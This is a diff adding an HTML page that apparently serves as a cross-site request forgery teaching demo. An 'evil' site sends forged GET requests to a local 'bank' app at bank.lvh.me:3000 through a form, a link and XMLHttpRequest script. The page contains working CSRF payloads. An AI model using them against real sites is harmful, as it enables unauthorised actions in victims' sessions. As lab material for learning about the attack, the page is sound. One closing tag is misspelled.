@@ -1,0 +1,45 @@
+<html>
+  <body>
+    Welcome to the evil world!
+
+    <div>
+      <h1>Iframe to evil's /hello</h1>
+    <iframe src="/hello"></iframe>
+    </div>
+      <h1>Form to save key value pair on evil</h1>
+    <form action="/set" method="GET">
+      <label for="key">key:</label>
+      <input type="text" name="key">
+      <label for="val">val:</label>
+      <input type="text" name="val">
+      <input type="submit">
+    </form>
+
+    <h1> EVIL STUFF!!!</h1>
+    <h2>Form to save key value pair on bank!</h2>
+    <form action="http://bank.lvh.me:3000/set" method="GET">
+      <label for="key">key:</label>
+      <input type="text" name="key">
+      <label for="val">val:</label>
+      <input type="text" name="val">
+      <input type="submit">
+    </form>
+    <h2>Link to similarly save key value pair on bank!</h2>
+    <a href="http://bank.lvh.me:3000/set?key=evil&val=washere">click me!</a>
+    <h2>JavaScript to save key value pairs on bank!</h2>
+    <script>
+      function reqListener () {
+        console.log(this.responseText);
+      }
+
+      function clickMe() {
+        var oReq = new XMLHttpRequest();
+        oReq.addEventListener("load", reqListener);
+        oReq.open("GET", "http://bank.lvh.me:3000/set?key=evil&val=javascript");
+        oReq.send();
+      }
+    </script>
+    <button onclick="clickMe()">click to launch!</buttoan>
+
+  </body>
+</html>
